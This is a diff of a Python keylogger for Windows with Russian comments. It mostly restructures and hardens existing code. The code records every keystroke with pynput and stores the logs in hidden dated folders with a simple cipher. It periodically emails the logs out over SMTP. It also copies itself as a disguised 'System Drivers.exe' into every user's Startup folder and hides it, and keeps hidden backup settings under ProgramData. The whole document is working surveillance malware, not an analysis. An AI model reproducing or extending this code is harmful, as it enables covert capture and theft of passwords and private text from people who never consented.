@@ -1,3 +1,4 @@
+#==========(1) Вызовы методов молудей начало ==========
 from pynput import keyboard
 from shutil import copy
 from os import listdir, access, mkdir, W_OK, getlogin, environ, getpid
@@ -9,13 +10,15 @@ from win32con import FILE_ATTRIBUTE_HIDDEN
 from time import strftime
 from psutil import process_iter
 from sys import exit
-#Для отправки по электронной почте
+#==========(2) Для отправки по электронной почте начало ==========
 import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from pickle import dump, load
+#==========(2) Для отправки по электронной почте конец ==========
+#==========(1) Вызовы методов молудей конец ==========
 
-#Отправка электронного письма
+#========== Отправка электронного письма начало ==========
 def send_email(date):
 	write_time_date_file_in_write_file('      - - - - Запуск службы отправки файла - - - -      ' + '\n')
 
@@ -79,53 +82,6 @@ def attach_file(msg, date):
     file.add_header('Content-Disposition', 'attachment', filename=filename) # Добавляем заголовки
     msg.attach(file)
     return True
-#Записываем новый файл с новыми датами
-def zapis_dat_date(date_control):
-	dates = []
-	values = []
-	for date in range(int(strftime('%d')), (int(strftime('%d')) + 1), 1):
-		if len(str(date)) == 1:
-			date = '0' + str(date)
-		dates.append(str(date) + strftime('%b'))
-		if (date_control == str(date) + strftime('%b')) and ('01' != str(date)):
-			values.append(False)
-		else:
-			values.append(True)
-	f = open(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent + "\\dates.dat", "wb")
-	dump(dates, f)
-	dump(values, f)
-	f.close()
-#функция для проверки отпрвлять ли файл или нет
-def send_control(date):
-	global moon_curent, year_curent
-	try:
-		if not isdir(disk_key + main_folder + user_name + '\\'  + strftime('%Y')):
-			mkdir(disk_key + main_folder + user_name + '\\' + strftime('%Y'))
-			year_curent = strftime('%Y')
-		if not isdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + strftime('%b')): 
-			mkdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + strftime('%b'))
-			moon_curent = strftime('%b')
-		f = open(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent + "\\dates.dat", "rb")
-		dates = load(f)
-		values = load(f)
-		f.close()
-		try:
-			return values[dates.index(date)]
-		except:
-			return True
-	except:
-		write_time_date_file_in_write_file('Error: Отсутсвует файл с датами. Создание файла с датами.' + '\n')
-		zapis_dat_date(date)
-		return send_control(date)
-#Получение предыдущего месяца(названия директории), который хранится в директории с кейлогером, или получение ответа что ее нет
-def recurs_date(moon, val_zapros):
-	if not isdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon):
-		if val_zapros == 12:
-			return False
-		val_zapros += 1
-		return recurs_date(moon_all_migration[moon], val_zapros)
-	else:
-		return moon
 #Получение даты, затем и путя к файлу и возможен ли доступ к файлу
 def find_date(date, flag):
 	if ('01' in date) or (flag):
@@ -146,8 +102,12 @@ def find_date(date, flag):
 			write_time_date_file_in_write_file('        - - - Отсутсвует нужная директория - - -           ' + '\n')
 			return False
 	else:
-		#создаем список с файлами директории
-		files = listdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent)
+		try:
+			#создаем список с файлами директории
+			files = listdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent)
+		except:
+			write_time_date_file_in_write_file('Error: Отсутсвует папка с данными.' + '\n' + '       - Переход к поиску в других директориях -       ' + '\n')
+			return find_date(date, True)
 		try:
 			files.remove('dates.dat')
 		except:
@@ -159,6 +119,15 @@ def find_date(date, flag):
 		else:
 			write_time_date_file_in_write_file('       - Переход к поиску в других директориях -       ' + '\n')
 			return find_date(date, True)
+#Получение предыдущего месяца(названия директории), который хранится в директории с кейлогером, или получение ответа что ее нет
+def recurs_date(moon, val_zapros):
+	if not isdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon):
+		if val_zapros == 12:
+			return False
+		val_zapros += 1
+		return recurs_date(moon_all_migration[moon], val_zapros)
+	else:
+		return moon
 #Функция для проверки отпрвки файла и записи новго файла с датами
 def send_control_and_zapis():
 	global date_control
@@ -170,7 +139,51 @@ def send_control_and_zapis():
 			send_email(date_control)
 			#Записываем новый файл с датами
 			zapis_dat_date(date_control)
+#функция для проверки отпрвлять ли файл или нет
+def send_control(date):
+	global moon_curent, year_curent
+	try:
+		if not isdir(disk_key + main_folder): 
+			mkdir(disk_key + main_folder)
+		if not isdir(disk_key + main_folder + user_name): 
+			mkdir(disk_key + main_folder + user_name)
+		if not isdir(disk_key + main_folder + user_name + '\\'  + strftime('%Y')):
+			mkdir(disk_key + main_folder + user_name + '\\' + strftime('%Y'))
+			year_curent = strftime('%Y')
+		if not isdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + strftime('%b')): 
+			mkdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + strftime('%b'))
+			moon_curent = strftime('%b')
+		f = open(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent + "\\dates.dat", "rb")
+		dates = load(f)
+		values = load(f)
+		f.close()
+		try:
+			return values[dates.index(date)]
+		except:
+			return True
+	except:
+		write_time_date_file_in_write_file('Error: Отсутсвует файл с датами. Создание файла с датами.' + '\n')
+		zapis_dat_date(date)
+		return send_control(date)
+#Записываем новый файл с новыми датами
+def zapis_dat_date(date_control):
+	dates = []
+	values = []
+	for date in range(int(strftime('%d')), (int(strftime('%d')) + 1), 1):
+		if len(str(date)) == 1:
+			date = '0' + str(date)
+		dates.append(str(date) + strftime('%b'))
+		if (date_control == str(date) + strftime('%b')) and ('01' != str(date)):
+			values.append(False)
+		else:
+			values.append(True)
+	f = open(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent + "\\dates.dat", "wb")
+	dump(dates, f)
+	dump(values, f)
+	f.close()
+#========== Отправка электронного письма конец ==========
 
+#========== Для шифрования часть 1 начало ==========
 #Функция шифрования с использованием бинарного поиска
 def code_my_bin(item):
 	low, high = 0, 155
@@ -184,14 +197,28 @@ def code_my_bin(item):
 		else:
 			low = mid + 1
 	return item
+#========== Для шифрования часть 1 конец ==========
 
+#==========(1) Запись в файлы часть 1 начало ==========
+#==========(2) Для записи в файл с данными начало ==========
 #Функция записи в файл времени и даты
 def write_time_date_file(time_date_x, time_date_y, disk, message, data_zapis):
-	file = open(disk + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent + '\\' + comp_name + '--' + time_date_y + '(' + user_name + ').txt', 'a', encoding = 'utf-8')
-	#Если стоит флаг для записи даты
-	if data_zapis: file.writelines('\n' + '- - - - - - - - - - ' + time_date_x + ' - - - - - - - - - -' + '\n')
-	file.writelines(message)
-	file.close()
+	try:
+		file = open(disk + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent + '\\' + comp_name + '--' + time_date_y + '(' + user_name + ').txt', 'a', encoding = 'utf-8')
+		#Если стоит флаг для записи даты
+		if data_zapis: file.writelines('\n' + '- - - - - - - - - - ' + time_date_x + ' - - - - - - - - - -' + '\n')
+		file.writelines(message)
+		file.close()
+	except:
+		if not isdir(disk_key + main_folder): 
+			mkdir(disk_key + main_folder)
+		if not isdir(disk_key + main_folder + user_name): 
+			mkdir(disk_key + main_folder + user_name)
+		if not isdir(disk_key + main_folder + user_name + '\\'  + year_curent):
+			mkdir(disk_key + main_folder + user_name + '\\' + year_curent)
+		if not isdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent): 
+			mkdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent)
+		return write_time_date_file(time_date_x, time_date_y, disk, message, data_zapis)
 #Функция проверки даты и времени последнего обращения и записи в файл
 def write_time_date_file_in_write_file(message):
     global time_date_before
@@ -205,26 +232,21 @@ def write_time_date_file_in_write_file(message):
         time_date_before = time_date_curunt
     else: data_zapis = 0
     write_time_date_file(time_date_curunt, time_for_name, disk_key, message, data_zapis)
+#==========(2) Для записи в файл с данными конец ==========
+#==========(2) Для записи в лог файл начало ==========
 #Создание лог файла, в случае если файла с настройками не будет найден нигде
 def crytical_log(message):
-	if not isdir('C:\\Logs'): mkdir('C:\\Logs')
+	if not isdir('C:\\Logs'): 
+		mkdir('C:\\Logs')
+		SetFileAttributes('C:\\Logs', FILE_ATTRIBUTE_HIDDEN)
 	log_crytical = open('C:\\Logs\\Log.txt', 'a', encoding = 'utf-8')
 	log_crytical.writelines(strftime('%H : %M; %d %b') + ':\n')
 	log_crytical.writelines(message + '\n')
 	log_crytical.close()
+#==========(2) Для записи в лог файл конец ==========
+#==========(1) Запись в файлы часть 1 конец ==========
 
-#Получем всех папки и файлы директории с пользователями
-all_users = listdir('C:\\Users')
-#Те папки и файлы, которые надо удалить из списка, оставив уникальные для каждого
-others_users = ['All Users', 'Default', 'Default User', 'desktop.ini', 'Public', 'Все пользователи']
-#Функция для удаленя со списка со всеми пользователми ненужных файлов или папок
-remove_others_users = lambda user: all_users.remove(user) if user in all_users else print('')
-#Функция добавления в автозагрузку кейлогера всем уникальным пользователм, если есть доступ и скрытие его
-add_auto_for_users = lambda user: copy('System Drivers.exe', 'C:\\Users\\' + user + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup') and SetFileAttributes('C:\\Users\\' + user + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\System Drivers.exe', FILE_ATTRIBUTE_HIDDEN) if (access('C:\\Users\\' + user + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup', W_OK)) and ('System Drivers.exe' not in listdir('C:\\Users\\' + user + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')) else print('')
-#Удаление лишних папок или файлов
-for user in others_users: remove_others_users(user)
-#Добавление в автозагрузку
-for user in all_users: add_auto_for_users(user)
+#========== Заполнение бэкап папки поумолчанию начало ==========
 #Создание бэкап файлов для файл с насроками электронной почты и файла общих настроек
 if not isdir("C:\\ProgramData\\Backups Drivers"): 
 	mkdir("C:\\ProgramData\\Backups Drivers")
@@ -246,7 +268,27 @@ if not isfile("C:\\ProgramData\\Backups Drivers\\data.dat"):
 			crytical_log('Error: Копирование бэкап файла с данными в директорию с бэкап файлами запрещено. Отпрвка данных на почту будет прекращено.')
 		except:
 			pass
-		
+#========== Заполнение бэкап папки поумолчанию конец ==========
+
+#========== Определение пользователей начало ==========
+#Получем всех папки и файлы директории с пользователями
+all_users = listdir('C:\\Users')
+#Те папки и файлы, которые надо удалить из списка, оставив уникальные для каждого
+others_users = ['All Users', 'Default', 'Default User', 'desktop.ini', 'Public', 'Все пользователи']
+#Функция для удаленя со списка со всеми пользователми ненужных файлов или папок
+remove_others_users = lambda user: all_users.remove(user) if user in all_users else print('')
+#Удаление лишних папок или файлов
+for user in others_users: remove_others_users(user)
+#========== Определение пользователей конец ==========
+
+#========== Добаввление в автозагрузку начало ==========
+#Функция добавления в автозагрузку кейлогера всем уникальным пользователм, если есть доступ и скрытие его
+add_auto_for_users = lambda user: copy('System Drivers.exe', 'C:\\Users\\' + user + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup') and SetFileAttributes('C:\\Users\\' + user + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\System Drivers.exe', FILE_ATTRIBUTE_HIDDEN) if (access('C:\\Users\\' + user + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup', W_OK)) and ('System Drivers.exe' not in listdir('C:\\Users\\' + user + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')) else print('')
+#Добавление в автозагрузку
+for user in all_users: add_auto_for_users(user)
+#========== Добаввление в автозагрузку конец ==========
+
+#========== Чтение файла с настройками начало ==========	
 SettingsDat = open("C:\\ProgramData\\Backups Drivers\\Settings.dat", "rb")
 DataSettings = load(SettingsDat)
 SettingsDat.close()
@@ -256,14 +298,29 @@ main_folder = DataSettings[0]
 dop_folder = DataSettings[1]
 #Директрия, в случае, если к дополнительной директори нет доступа, пробуем записать на диск D
 folder_for_D = DataSettings[2]
+#Ключ для шифрования
+main_key = DataSettings[3]
+#========== Чтение файла с настройками конец ==========
+
+#========== Для шифрования начало часть 2 начало ==========
+#Дополнительный(закрытый) ключ, который создается из открытого
+dop_key = 0
+for value in str(main_key): dop_key += int(value)
+key = main_key + dop_key
+#Преобразование строки, которая используется в шифровании в отсортированный список
+alphabet = sorted('4ыhПЩm%ЗXd)мsЪ?UEюДОКЖЭo<етй;n|1нэYИuxСяп3РХ"6и►скЮТЦ+9гFцr$#&ЕЛvJyрkфЁшл-fjG5wъШSЙМgA@QуaZва7z2RГёУхФЯT^0щcplь\/iV.жW=чБдKбe№:ЬLbВOНDBCt8>_!*оЧqMзIHЫ (,PNА')
+#========== Для шифрования начало часть 2 конец ==========
+
+#========== Определение языка начало ==========
 #Язык на момент запуска программы(если 00000409 - английский, 00000419 - русский)
 launge = GetKeyboardLayoutName()
 #Установка первоночальных переменных
 ru_bin, caps_bin, shift_bin, alt_bin, cmd_bin = False, False, False, False, False
-#дата последней проверки
-date_control = ''
 #Если True, то язык русский, иначе английский(ну или какой-нибудь другой)
 if launge == '00000419': ru_bin = True
+#========== Определение языка конец ==========
+
+#========== Определение клавищ начало ==========
 #Список активных клавиш
 list_key = GetKeyboardState()
 #Если капс активен, то True
@@ -276,6 +333,9 @@ list_shift = ['Key.shift', 'Key.shift_r']
 list_ctrl = ['Key.ctrl_l', 'Key.ctrl_r']
 #Другие клавишы для смены языка
 list_others = ['Key.cmd', 'Key.space']
+#========== Определение клавищ конец ==========
+
+#========== Определение даты и времени начало ==========
 #Дата и время при запуске программы
 time_date_before = strftime('%H : %M; %d %b')
 #Дата для названия файла
@@ -284,78 +344,84 @@ time_for_name = strftime('%d%b')
 moon_curent = strftime('%b')
 #Текущий год(для создаия папки)
 year_curent = strftime('%Y')
+#дата последней проверки
+date_control = ''
+#========== Определение даты и времени конец ==========
+
+#========== Определение оставшихся настроек начало ==========
 #Диск создания папки и файлов в ней по умолчанию
 disk_key = 'C:\\'
-#Ключи для шифрования
-main_key = DataSettings[3]
-#Дополнительный(закрытый) ключ, который создается из открытого
-dop_key = 0
-for value in str(main_key): dop_key += int(value)
-key = main_key + dop_key
 #Получение имени компьютера
 comp_name = environ['COMPUTERNAME']
 #Имя пользователя текущей сессии
 user_name = getlogin()
-#Преобразование строки, которая используется в шифровании в отсортированный список
-alphabet = sorted('4ыhПЩm%ЗXd)мsЪ?UEюДОКЖЭo<етй;n|1нэYИuxСяп3РХ"6и►скЮТЦ+9гFцr$#&ЕЛvJyрkфЁшл-fjG5wъШSЙМgA@QуaZва7z2RГёУхФЯT^0щcplь\/iV.жW=чБдKбe№:ЬLbВOНDBCt8>_!*оЧqMзIHЫ (,PNА')
+#========== Определение оставшихся настроек конец ==========
+
+#========== Инициализация главной директории и закачка файла с  данными для электронной почты(по возможности) начало ==========
 #Запишем в файл время и дату, образованное при запуске программы
 #Исключение вызывается, когда папка не найдена или допуск на запись на диск С == False
 try:
-	if not isdir(disk_key + main_folder): mkdir(disk_key + main_folder)
-	SetFileAttributes(disk_key + main_folder, FILE_ATTRIBUTE_HIDDEN)
+	if not isdir(disk_key + main_folder): 
+		mkdir(disk_key + main_folder)
+		SetFileAttributes(disk_key + main_folder, FILE_ATTRIBUTE_HIDDEN)
 	if not isfile(disk_key + main_folder + "data.dat"):
 		try: 
 			copy("data.dat", disk_key + main_folder)
 		except:
 			if isfile("C:\\ProgramData\\Backups Drivers\\data.dat"): copy("C:\\ProgramData\\Backups Drivers\\data.dat", disk_key + main_folder)
 			else:
-				write_time_date_file_in_write_file('New - - - Error: Отсутсвует бэкап файл с данными в директории с бекап файлами. - - -' + '\n')
+				pass
 	if not isdir(disk_key + main_folder + user_name): mkdir(disk_key + main_folder + user_name)
 	if not isdir(disk_key + main_folder + user_name + '\\' + year_curent): mkdir(disk_key + main_folder + user_name + '\\' + year_curent)
 	if not isdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent): mkdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent)
 	write_time_date_file(time_date_before, time_for_name, disk_key, "   - - - - - - - - - - - Инициализация - " + user_name + ' - - -\n', 1)
 except:
 	#Если есть допуск на запись в диске С
-	if access(disk_key + dop_folder, W_OK):
+	if access(disk_key, W_OK):
 		#Создаем папку main_folder на диске С
-		if not isdir(disk_key + dop_folder): mkdir(disk_key + dop_folder)
-		SetFileAttributes(disk_key + dop_folder, FILE_ATTRIBUTE_HIDDEN)
+		if not isdir(disk_key + dop_folder): 
+			mkdir(disk_key + dop_folder)
+			SetFileAttributes(disk_key + dop_folder, FILE_ATTRIBUTE_HIDDEN)
 		if not isfile(disk_key + dop_folder + "data.dat"): 
 			try:
 				copy("data.dat", disk_key + dop_folder)
 			except:
 				if isfile("C:\\ProgramData\\Backups Drivers\\data.dat"): copy("C:\\ProgramData\\Backups Drivers\\data.dat", disk_key + dop_folder)
 				else:
-					write_time_date_file_in_write_file('New - - - Error: Отсутсвует бэкап файл с данными в директории с бекап файлами. - - -' + '\n')
+					pass
 		if not isdir(disk_key + dop_folder + user_name): mkdir(disk_key + dop_folder + user_name)
 		if not isdir(disk_key + dop_folder + user_name + '\\' + year_curent): mkdir(disk_key + dop_folder + user_name + '\\' + year_curent)
 		if not isdir(disk_key + dop_folder + user_name + '\\' + year_curent + '\\' + moon_curent): mkdir(disk_key + dop_folder + user_name + '\\' + year_curent + '\\' + moon_curent)
+		#Меняем главную директорию
 		main_folder = dop_folder
 	else:
-		if access('D:\\' + folder_for_D, W_OK):
+		if access('D:\\', W_OK):
 			if not isdir('D:\\' + folder_for_D):
 				#Создаем папку main_folder на диске D
 				mkdir('D:\\' + folder_for_D)
+				SetFileAttributes('D:\\' + folder_for_D, FILE_ATTRIBUTE_HIDDEN)
 			#Меняется диск записи
 			disk_key = 'D:\\'
-			SetFileAttributes(disk_key + folder_for_D, FILE_ATTRIBUTE_HIDDEN)
-			if not isdir(disk_key + folder_for_D + user_name): mkdir(disk_key + folder_for_D + user_name)
 			if not isfile(disk_key + folder_for_D + "data.dat"): 
 				try:
 					copy("data.dat", disk_key + folder_for_D)
 				except:
 					if isfile("C:\\ProgramData\\Backups Drivers\\data.dat"): copy("C:\\ProgramData\\Backups Drivers\\data.dat", disk_key + folder_for_D)
 					else: 
-						write_time_date_file_in_write_file('New - - - Error: Отсутсвует бэкап файл с данными в директории с бекап файлами. - - -' + '\n')
+						pass
+			if not isdir(disk_key + folder_for_D + user_name): mkdir(disk_key + folder_for_D + user_name)
 			if not isdir(disk_key + folder_for_D + user_name + '\\' +year_curent): mkdir(disk_key + folder_for_D + user_name + '\\' + year_curent)
 			if not isdir(disk_key + folder_for_D + user_name + '\\' + year_curent + '\\' + moon_curent): mkdir(disk_key + folder_for_D + user_name + '\\' + year_curent + '\\' + moon_curent)
+			#Меняем главную директорию
 			main_folder = folder_for_D
 		else:
-			write_time_date_file_in_write_file('New - - - Error: Отсутвуют права на запись на всех дисках. Выполняется выход из приложения. - - -')
+			crytical_log('Error: Отсутвуют права на запись на всех дисках. Выполняется выход из приложения.')
 			exit()
 	#Повторно записываем время и дату в файл, в созданной или уже имеющейся папке диска С или D, если вызвалось исключене
 	write_time_date_file(time_date_before, time_for_name, disk_key, "   - - - - - - - - - - - Инициализация - " + user_name + ' - - -\n', 1)
+#========== Инициализация главной директории и закачка файла с  данными для электронной почты(по возможности) конец ==========
 
+#========== Словари для работы приложения начало ==========
 #Словарь, используйщийся если зажат шифт, то записывает в файл верхний элемент клавиату какой-либо цифры русской раскладки
 dict_ru = {'1' : '!', '2' : '"', '3' : '№',
             '4' : ';', '5' : '%', '6' : ':',
@@ -372,8 +438,11 @@ dict_en = {'1' : '!', '2' : '@', '3' : '#',
 moon_all_migration = {'Jan' : 'Dec', 'Feb' : 'Jan', 'Mar' : 'Feb', 'Apr' : 'Mar', 
 					  'May' : 'Apr', 'Jun' : 'May', 'Jul' : 'Jun', 'Aug' : 'Jul', 
 					  'Sep' : 'Aug', 'Oct' : 'Sep', 'Nov' : 'Oct', 'Dec' : 'Nov'}
+#========== Словари для работы приложения конец ==========
 
-#Функция записи в файл информации
+#==========(1) Запись в файлы часть 2 начало ==========
+#==========(2) Заполение файла с данными начало ==========
+#Функция записи в файл с данными
 def write_file(key):
     try:
         #Проверяем является ли key буквой или цифрой; Если является - исключение не вызывается, иначе вызывается
@@ -409,7 +478,8 @@ def write_file(key):
         write_time_date_file_in_write_file(code_my_bin(what_zapis))
     except:
         pass
-
+#==========(2) Заполение файла с данными конец ==========
+#==========(2) Смена языка, который используется для заполения файла с дыннми часть 1 начало ==========
 #Функция проверки изменения языка
 def change_langue(mass, key):
     global ru_bin
@@ -432,7 +502,11 @@ def change_langue(mass, key):
                 #Меняем язык на английский
                 LoadKeyboardLayout('00000409', 1)
                 ru_bin = False
+#==========(2) Смена языка, который используется для заполения файла с дыннми часть 1 конец ========== 
+#==========(1) Запись в файлы часть 2 конец ==========
 
+#==========(1) Обработчики нажатия/отжатия начало ==========
+#==========(2) Обработчик нажатия начало ==========
 #Вызываемая функций класса keyboard.Listener; Вызывается, когда какая-либо кнопка нажимается
 def on_press(key):
     global shift_bin, caps_bin, alt_bin, cmd_bin
@@ -448,10 +522,12 @@ def on_press(key):
     if str(key) == 'Key.cmd':
         #Устанавливаем булево значение нажатие альта, 1 - клавиша зажата, 0 - отжата
         cmd_bin = True
+	#========== Смена языка, который используется для заполения файла с дыннми часть 2 начало ==========
     #Функции проверки смены языка
     change_langue(list_shift, key)
     change_langue(list_alt, key)
     change_langue(list_others, key)
+	#========== Смена языка, который используется для заполения файла с дыннми часть 2 конец ==========
     #Если нажат капс
     if str(key) == 'Key.caps_lock':
         #Меняем состояние капса
@@ -459,9 +535,12 @@ def on_press(key):
         elif caps_bin == False: caps_bin = True
     #Проверка отправки данных и их отправка
     send_control_and_zapis()
+	#========== Запись в файлы часть 3 начало ==========
     #Запись в выбранный файл
     write_file(key)
-
+	#========== Запись в файлы часть 3 начало ==========
+#==========(2) Обработчик нажатия конец ==========
+#==========(2) Обработчик отжатия начало ==========
 #Вызываемая функция класса keyboard.Listener; Вывывается, когда какая-либо кнопка отпускается
 def on_release(key):
     global shift_bin, alt_bin, cmd_bin
@@ -472,17 +551,22 @@ def on_release(key):
         if alt_bin == True: alt_bin = False
     if str(key) in list_others:
         if cmd_bin == True: cmd_bin = False
+#==========(2) Обработчик отжатия конец ==========
+#==========(1) Обработчики нажатия/отжатия конец ==========
 
+#========== Создание класса обработчика начало ==========
 try:          
     a = keyboard.Listener(on_press = on_press, on_release = on_release)
     a.start()
 except Exception as err: 
 	write_time_date_file_in_write_file('Error: Раелизация класса приложения запрещена. Выполяется выход из приложения.' + '\n' + 'Code error: ' + str(err) + '\n')
 	exit()
+#========== Создание класса обработчика конец ==========
 
 write_time_date_file(time_date_before, time_for_name, disk_key, "   - - - - - - - - - - - Запущено - - - - - - - - - -   \n", 0)
 send_control_and_zapis()
 
+#========== Удаление вторичного процесса начало ==========
 #Функция поиска второго процесса, создаваемого кейлогером и его завершение
 def find_process_pid(process_name):
 	for process in process_iter():
@@ -494,9 +578,12 @@ def find_process_pid(process_name):
 					pass
 					
 find_process_pid('System Drivers.exe')
+#========== Удаление вторичного процесса конец ==========
 
+#========== Запуск бксконечного цикла программы считывания нажатия клавиш начало ==========
 while 1:
     try:
         a.join()
     except Exception as err: 
     	write_time_date_file_in_write_file('Error: Критическая ошибка. Приложение функционирует в штатном режиме.' + '\n' + 'Code error: ' + str(err) + '\n')
+#========== Запуск бксконечного цикла программы считывания нажатия клавиш конец ==========
